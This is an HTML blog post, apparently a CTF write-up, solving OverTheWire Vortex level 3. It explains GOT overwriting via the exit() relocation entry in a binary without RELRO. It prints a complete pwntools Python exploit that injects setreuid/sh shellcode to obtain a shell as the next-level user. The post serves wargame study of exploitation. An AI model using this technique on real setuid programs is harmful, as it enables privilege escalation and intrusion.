@@ -1,0 +1,311 @@
+<!DOCTYPE HTML>
+<html>
+<head>
+  <meta charset="utf-8">
+  <meta http-equiv="pragma" content="no-cache">
+  <meta http-equiv="cache-control" content="no-cache">
+  <meta http-equiv="expires" content="0">
+  
+  <title>overthewire.vortex.lvl[3-4] | neuromancer</title>
+  <meta name="author" content="Mustafa Algayar">
+  
+  <meta name="description" content="Level Goal
+This level is pretty straight forward. Just sit down and understand what the code is doing. Your shellcode will require a setuid(LEVEL4_UID) since bash drops effective privileges. You could alternatively write a quick setuid(geteuid()) wrapper around bash.
+NOTE: ctors/dtors might no longer be writable, although this level is compiled with -Wl,-z,norelro. Lookup some information about this e.g. here
+overthewire.vortex.lvl3-4
+
+Solution
+this level is all about how program’s flow can be changed by modifying the entries of the global offset table structure for ELF binaries.
+first i start with basic static analysis for the ELF binary
+
+so using basic static analysis we know the following about the vulnerable ELF binary
+
+it’s a dynamically linked executable (there exist a DYNAMIC program header) and the type of this ELF is ET_EXEC (in turn it’s not a PIE ELF binary)
+
+compiled without full or partial RELRO (thers is no GNU_RELRO program header and BIND_NOW FLAG is not set)
+
+stack canary protection is not applied
+
+the stack is marked as executable
+
+
+this a dynamically linked executable that is compiled with lazy binding which means that the dynamic linker will not link the calls to external (library) functions until the first time the function is being called this all done with the help of the PLT and GOT sections."> 
+  
+  
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+
+  <meta property="og:title" content="overthewire.vortex.lvl[3-4]"/>
+  <meta property="og:site_name" content="neuromancer"/>
+
+  
+    <meta property="og:image" content=""/>
+  
+
+  
+    <link rel="alternative" href="/atom.xml" title="neuromancer" type="application/atom+xml">
+  
+  
+    <link href="/favicon.png" rel="icon">
+  
+  
+  <link rel="stylesheet" href="/css/bootstrap.min.css" media="screen" type="text/css">
+  <link rel="stylesheet" href="/css/font-awesome.css" media="screen" type="text/css">
+  <link rel="stylesheet" href="/css/style.css" media="screen" type="text/css">
+  <link rel="stylesheet" href="/css/responsive.css" media="screen" type="text/css">
+  <link rel="stylesheet" href="/css/highlight.css" media="screen" type="text/css">
+  <link rel="stylesheet" href="/css/google-fonts.css" media="screen" type="text/css">
+  <!--[if lt IE 9]><script src="//html5shiv.googlecode.com/svn/trunk/html5.js"></script><![endif]-->
+
+  <script src="/js/jquery-2.0.3.min.js"></script>
+
+  <!-- analytics -->
+  
+
+
+
+
+<meta name="generator" content="Hexo 4.2.0"></head>
+
+ <body>  
+  <nav id="main-nav" class="navbar navbar-inverse navbar-fixed-top" role="navigation">
+    <div class="container">
+      <button type="button" class="navbar-header navbar-toggle" data-toggle="collapse" data-target=".navbar-collapse">
+		<span class="sr-only">Toggle navigation</span>
+        <span class="icon-bar"></span>
+        <span class="icon-bar"></span>
+        <span class="icon-bar"></span>
+      </button>
+	  <a class="navbar-brand" href="/">neuromancer</a>
+      <div class="collapse navbar-collapse nav-menu">
+		<ul class="nav navbar-nav">
+		  
+		  <li>
+			<a href="/archives" title="All the articles.">
+			  <i class="fa fa-archive"></i>Archives
+			</a>
+		  </li>
+		  
+		  <li>
+			<a href="/tags" title="All the tags.">
+			  <i class="fa fa-tags"></i>Tags
+			</a>
+		  </li>
+		  
+		  <li>
+			<a href="/about" title="About me.">
+			  <i class="fa fa-user"></i>About
+			</a>
+		  </li>
+		  
+		</ul>
+      </div>
+    </div> <!-- container -->
+</nav>
+<div class="clearfix"></div>
+
+  <div class="container">
+  	<div class="content">
+    	 
+
+
+	
+		<div class="page-header">
+			<h1> overthewire.vortex.lvl[3-4]</h1>
+		</div>
+	
+
+
+
+<div class="row post">
+	<!-- cols -->
+	
+	<div id="top_meta"></div>
+	<div class="col-md-9">
+	
+
+	<!-- content -->
+	<div class="mypage">		
+	  		
+
+	  <h1 id="Level-Goal"><a href="#Level-Goal" class="headerlink" title="Level Goal"></a>Level Goal</h1><hr>
+<blockquote><p>This level is pretty straight forward. Just sit down and understand what the code is doing. Your shellcode will require a setuid(LEVEL4_UID) since bash drops effective privileges. You could alternatively write a quick setuid(geteuid()) wrapper around bash.</p>
+<p>NOTE: ctors/dtors might no longer be writable, although this level is compiled with -Wl,-z,norelro. Lookup some information about this e.g. <a href="https://unix.stackexchange.com/questions/8062/dtors-looks-writable-but-attempts-to-write-segfault" target="_blank" rel="noopener">here</a></p>
+<footer><strong>overthewire.vortex.</strong><cite><a href="https://overthewire.org/wargames/vortex/vortex3.html" target="_blank" rel="noopener">lvl3-4</a></cite></footer></blockquote>
+
+<h1 id="Solution"><a href="#Solution" class="headerlink" title="Solution"></a>Solution</h1><hr>
+<p>this level is all about how program’s flow can be changed by modifying the entries of the <a href="https://reverseengineering.stackexchange.com/questions/1992/what-is-plt-got" target="_blank" rel="noopener">global offset table</a> structure for ELF binaries.</p>
+<p>first i start with basic static analysis for the ELF binary</p>
+<p><img src="/images/ctf/wargames/overthewire/vortex/lvl3-4/01.png" alt="img01"><br><img src="/images/ctf/wargames/overthewire/vortex/lvl3-4/02.png" alt="img02"><br><img src="/images/ctf/wargames/overthewire/vortex/lvl3-4/03.png" alt="img03"><br><img src="/images/ctf/wargames/overthewire/vortex/lvl3-4/04.png" alt="img04"></p>
+<p>so using basic static analysis we know the following about the vulnerable ELF binary</p>
+<ul>
+<li><p>it’s a dynamically linked executable (there exist a DYNAMIC program header) and the type of this ELF is ET_EXEC (in turn it’s not a <a href="https://stackoverflow.com/questions/2463150/what-is-the-fpie-option-for-position-independent-executables-in-gcc-and-ld" target="_blank" rel="noopener">PIE</a> ELF binary)</p>
+</li>
+<li><p>compiled without full or partial <a href="http://tk-blog.blogspot.com/2009/02/relro-not-so-well-known-memory.html" target="_blank" rel="noopener">RELRO</a> (thers is no GNU_RELRO program header and BIND_NOW FLAG is not set)</p>
+</li>
+<li><p>stack canary protection is not applied</p>
+</li>
+<li><p>the stack is marked as executable</p>
+</li>
+</ul>
+<p>this a dynamically linked executable that is compiled with lazy binding which means that the dynamic linker will not link the calls to external (library) functions until the first time the function is being called this all done with the help of the PLT and GOT sections.</p>
+<a id="more"></a>
+
+<p>from the source code of the vulnerable executable we can see that exit(3) is the only library function that is being called before the function main() returns after we overflow the vulnerable buffer.</p>
+<p><img src="/images/ctf/wargames/overthewire/vortex/lvl3-4/05.png" alt="img05"></p>
+<p>the lpp is a pointer to a pointer that is initialized to point to the lp pointer, but we will assume that it points to a pointer named X.</p>
+<p><img src="/images/ctf/wargames/overthewire/vortex/lvl3-4/06.png" alt="img06"></p>
+<p>now the contents of the address pointed to by the X pointer is being modifed to store the address of the vulnerable buffer.</p>
+<p><img src="/images/ctf/wargames/overthewire/vortex/lvl3-4/07.png" alt="img07"></p>
+<p>so our goal here is to overwrite the lpp pointer with X address that will enable us to overwrite the global offset table entry for the exit function.</p>
+<p>so our goal here is to find an address that contains the address of the global offset table entry for the exit function (finding X).</p>
+<p>for a dynamically linked ELF binary, when a library function is being called, a call to the address contained in the global offset table entry for this function is performed, which for binaries compiled with lazy binding will be the address of a trampoline in the PLT section that calls the dynamic linker’s resolve function after providing it with the needed information to patch the target global offset table entry with the function’s address, so subsequent calls will be transefered directly to the library function.</p>
+<p>the relocation table is the ELF structure that aid the dynamic linker in the process of resolving references to external symbols.</p>
+<p><img src="/images/ctf/wargames/overthewire/vortex/lvl3-4/08.png" alt="img08"></p>
+<p>the r_offset field of the relocation table stores the address of the global offset table entry for the referenced symbol.</p>
+<p>now the address of the r_offset field of the relocation table is the X we are searching for.</p>
+<p>so we will overwrite lpp (which is a pointer to pointer) with the address of r_offset field for the relocation entry of the exit(3) library function.</p>
+<p>now when the last exit(3) function is being called, our shellcode (which will begin at the start of the vulnerable buffer) will be executed.</p>
+<p>disassembling the binary and calculating the local variables offsets we can draw the layout of the local variables in the stack.</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">+---------+---------+---------+</span><br><span class="line">|   buf   |   tmp   |   lpp   |</span><br><span class="line">+---------+---------+---------+</span><br><span class="line"> 128 bytes  4 bytes   4 bytes</span><br></pre></td></tr></table></figure>
+
+<p>now i will test this out, our dummy shellcode will consist only of the opcode for the hlt instruction, if we hit the hlt instruction then we are good and we can move to implementing an automated exploit for this vulernable binary.</p>
+<p><img src="/images/ctf/wargames/overthewire/vortex/lvl3-4/09.png" alt="img09"><br><img src="/images/ctf/wargames/overthewire/vortex/lvl3-4/10.png" alt="img10"></p>
+<p>we hit the hlt instruction so we are moving in the right direction, great!.</p>
+<p>now i will write an exploit for this vulernable binary that will enable us to get a shell as user vortex4.</p>
+<figure class="highlight python"><figcaption><span>expl0it.py</span><a href="https://github.com/En14c/rand0m.scr1pts/blob/master/ctf/wargames/overthewire/vortex/lvl3-4/expl0it.py" target="_blank" rel="noopener">view on github</a></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python2</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="keyword">import</span> struct</span><br><span class="line"><span class="keyword">import</span> subprocess</span><br><span class="line"><span class="keyword">import</span> pwn</span><br><span class="line"></span><br><span class="line">pwn.context(arch=<span class="string">"i386"</span>, os=<span class="string">"linux"</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># get user vortex4's uid</span></span><br><span class="line"><span class="keyword">with</span> open(<span class="string">"/etc/passwd"</span>, <span class="string">"r"</span>) <span class="keyword">as</span> fd:</span><br><span class="line">    r_buf = fd.read()</span><br><span class="line">    match = re.search(<span class="string">'(?P&lt;vortex4_passwd_entry&gt;vortex4:x:\d:\d)'</span>, r_buf)</span><br><span class="line">    <span class="keyword">if</span> match:</span><br><span class="line">        vortex4_uid = int(</span><br><span class="line">            match.group(<span class="string">'vortex4_passwd_entry'</span>).split(<span class="string">':'</span>)[<span class="number">-1</span>])</span><br><span class="line">        <span class="keyword">print</span> <span class="string">'found user vortex4 with uid: [&#123;0&#125;]'</span>.format(vortex4_uid)</span><br><span class="line"></span><br><span class="line"><span class="keyword">print</span> <span class="string">'generating shellcode... '</span>,</span><br><span class="line"></span><br><span class="line">shellcode = pwn.asm(pwn.shellcraft.setreuid() + pwn.shellcraft.sh())</span><br><span class="line"></span><br><span class="line"><span class="string">'''</span></span><br><span class="line"><span class="string">[ 0x80482a4 ] is the r_offset field of the exit() function's entry</span></span><br><span class="line"><span class="string">in the dynamic relocation table</span></span><br><span class="line"><span class="string">'''</span></span><br><span class="line"><span class="comment"># address of dynamic relocation table entry for libc's exit()</span></span><br><span class="line">exit_reltab_addr = struct.pack(<span class="string">'&lt;I'</span>, <span class="number">0x80482a4</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 132 = sizeof(vuln_buf) + sizeof(tmp_ptr)</span></span><br><span class="line">exp_egg = shellcode + \</span><br><span class="line">    (<span class="string">'\x41'</span> * (<span class="number">132</span> - len(shellcode))) + exit_reltab_addr</span><br><span class="line"></span><br><span class="line"><span class="keyword">print</span> <span class="string">'[done]'</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">print</span> <span class="string">'trying to exploit the vulnerable binary'</span></span><br><span class="line"></span><br><span class="line">exit_stat = subprocess.call([<span class="string">"./vortex3"</span>, exp_egg])</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> exit_stat != os.EX_OK:</span><br><span class="line">    <span class="keyword">print</span> <span class="string">'failed to exploit the vulnerable binary'</span></span><br></pre></td></tr></table></figure>
+
+<p>now let’s execute the script.</p>
+<p><img src="/images/ctf/wargames/overthewire/vortex/lvl3-4/11.png" alt="img11"></p>
+<p>great!, we got the password for user vortex4 and we are done.</p>
+
+	  
+	</div>
+
+	
+	<span id="/2020/02/02/overthewire-vortex-lvl3-4/" class="leancloud-visitors view" data-flag-title="overthewire.vortex.lvl[3-4]">
+		<em class="post-meta-item-text"> Page View </em> <i class="leancloud-visitors-count"></i>
+	</span>
+	
+	<div>
+  	<center>
+
+	<div class="pagination">
+
+    
+    
+    <a type="button" class="btn btn-default disabled"><i class="fa fa-arrow-circle-o-left"></i>Prev</a>
+    
+
+    <a href="/" type="button" class="btn btn-default"><i class="fa fa-home"></i>Home</a>
+    
+    <a href="/2020/02/02/overthewire-vortex-lvl2-3/" type="button" class="btn btn-default ">Next<i
+                class="fa fa-arrow-circle-o-right"></i></a>
+    
+
+    
+</div>
+
+
+    </center>
+	</div>
+	
+	<!-- comment -->
+	<!--
+<section id="comment">
+    <h2 class="title">Comments</h2>
+
+    
+</section>
+
+-->
+	
+	</div> <!-- col-md-9/col-md-12 -->
+
+
+	
+	<div id="side_meta">
+		<div class="col-md-3" id="post_meta"> 
+
+	<!-- date -->
+	
+	<div class="meta-widget">
+	<i class="fa fa-clock-o"></i>
+	2020-02-02 
+	</div>
+	
+
+	<!-- categories -->
+    
+
+	<!-- tags -->
+	
+	<div class="meta-widget">
+	<a data-toggle="collapse" data-target="#tags"><i class="fa fa-tags"></i></a>		  
+    <ul id="tags" class="tag_box list-unstyled collapse in">	  
+	    
+  <li><a href="/tags/wargames/">wargames<span>25</span></a></li> <li><a href="/tags/ctf/">ctf<span>25</span></a></li> <li><a href="/tags/overthewire/">overthewire<span>25</span></a></li> <li><a href="/tags/vortex/">vortex<span>4</span></a></li>
+    </ul>
+	</div>
+		
+
+	<!-- toc -->
+	<div class="meta-widget">
+	
+	</div>
+	
+    <hr>
+	
+</div><!-- col-md-3 -->
+
+		
+
+	</div>
+	
+		
+
+</div><!-- row -->
+
+<!--
+ -->
+
+
+
+	</div>
+  </div>
+  <div class="container-narrow">
+  <footer> <p>
+  &copy; 2020 Mustafa Algayar's Blog
+  
+  powered by <a href="http://hexo.io/" target="_blank">Hexo</a>.
+  theme <a href="https://github.com/Ares-X/hexo-theme-freemind.bithack" target="_blank">
+      freemind.bithack</a>
+</p>
+ </footer>
+</div> <!-- container-narrow -->
+  
+
+
+  
+<a id="gotop" href="#">   
+  <span>⬆︎TOP</span>
+</a>
+
+<script src="/js/jquery.imagesloaded.min.js"></script>
+<script src="/js/gallery.js"></script>
+<script src="/js/bootstrap.min.js"></script>
+<script src="/js/main.js"></script>
+<script src="/js/search.js"></script> 
+
+
+<link rel="stylesheet" href="/fancybox/jquery.fancybox.css" media="screen" type="text/css">
+<script src="/fancybox/jquery.fancybox.pack.js"></script>
+<script type="text/javascript">
+(function($){
+  $('.fancybox').fancybox();
+})(jQuery);
+</script>
+
+
+
+</body>
+   </html>
